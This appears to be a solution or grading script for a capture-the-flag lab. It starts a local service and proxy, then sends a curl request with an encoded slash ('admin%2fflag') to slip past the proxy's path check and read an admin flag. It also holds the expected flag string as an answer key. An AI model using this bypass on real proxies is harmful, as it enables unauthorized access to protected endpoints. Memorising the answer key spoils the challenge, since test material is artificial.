#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."

python3 resources/internal_service.py &
INT=$!
python3 resources/proxy.py &
PROXY=$!
trap 'kill $INT $PROXY 2>/dev/null || true' EXIT

sleep 1
FLAG=$(curl -s 'http://127.0.0.1:9098/admin%2fflag')
echo "$FLAG"
test "$FLAG" = 'FLAG{ssrf_path_normalization_bypass}'